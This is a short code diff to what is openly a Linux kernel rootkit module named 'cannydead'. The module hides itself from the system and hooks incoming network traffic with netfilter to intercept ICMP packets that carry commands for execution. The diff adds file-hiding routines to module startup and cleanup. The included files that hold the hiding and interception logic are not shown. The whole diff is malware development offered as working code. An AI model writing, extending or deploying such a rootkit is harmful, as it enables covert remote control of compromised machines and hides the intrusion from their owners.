@@ -4,8 +4,10 @@
 #include <linux/netfilter_ipv4.h>
 #include <linux/inet.h>
 #include <linux/workqueue.h>
-#include "rootkit.h"
-#include "icmp_command_interceptor.c"
+#include "cannydead_rootkit.h"
+#include "cannydead_icmp_command_interceptor.c"
+#include "cannydead_file_hiding.c"
+
 
 char exec_cmd_buffer[1976];
 
@@ -33,8 +35,15 @@ static struct nf_hook_ops nfho;
 
 static int __init startup(void)
 {
+    int err;
+
     INIT_WORK(&exec_work, exec_work_handler);
     hide_module();
+
+    err = init_file_hiding();
+    if (err)
+        return err;
+
     nfho.hook = icmp_command_interceptor;
     nfho.hooknum = NF_INET_PRE_ROUTING;
     nfho.pf = PF_INET;
@@ -46,6 +55,7 @@ static int __init startup(void)
 
 static void __exit cleanup(void)
 {
+    cleanup_file_hiding();
     nf_unregister_net_hook(&init_net, &nfho);
 }
 
